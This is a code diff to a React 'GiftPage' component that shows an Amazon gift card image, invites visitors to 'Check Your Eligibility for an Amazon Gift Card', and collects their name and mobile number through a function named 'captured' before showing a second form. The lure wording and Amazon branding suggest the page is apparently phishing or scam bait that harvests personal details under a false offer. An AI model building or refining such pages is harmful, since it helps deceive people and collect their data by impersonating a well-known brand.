@@ -1,6 +1,7 @@
 import React, { useState } from 'react';
 import Form from './Form';
 import './GiftPage.css'; // Import the CSS file for styling
+import amazon from './amazongc.png'
 
 const GiftPage = () => {
   const [next, setNext] = useState(false);
@@ -46,14 +47,13 @@ const GiftPage = () => {
     }
 
     // Perform form submission or other actions with the form data
-    console.log(formData);
+    
     captured()
     
   };
 
   const captured =()=>{
     setNext(true);
-    console.log("captured");
   }
 
   return (
@@ -62,12 +62,13 @@ const GiftPage = () => {
       <div className="gift-page__image-container">
         <img
           className="gift-page__image"
-          src="https://d1o7uku192uawx.cloudfront.net/mobile/media/catalog/product/3/1/312x200_20092022_1_4.png"
+          src={amazon}
           alt="Gift"
         />
       </div>
-      <h1 className="gift-page__title">Congratulations!</h1>
-      <p className="gift-page__message">You have won a special gift.</p>
+      {!next && <div>
+      <h1 className="gift-page__title">Unlock Exclusive Benefits!</h1>
+      <p className="gift-page__message">Check Your Eligibility for an Amazon Gift Card</p>
       <form onSubmit={handleSubmit} className="gift-page__form">
         <div className="gift-page__form-field">
           <label htmlFor="name">Name:</label>
@@ -94,9 +95,9 @@ const GiftPage = () => {
           {formErrors.mobile && <span className="error-message">{formErrors.mobile}</span>}
         </div>
         <button type="submit" className="gift-page__claim-button" >
-          Claim Now
+          Check Eligibility
         </button>
-      </form>
+      </form></div>}
     </div>
     {next && <Form name={formData.name} mobile={formData.mobile}/>}
     </>
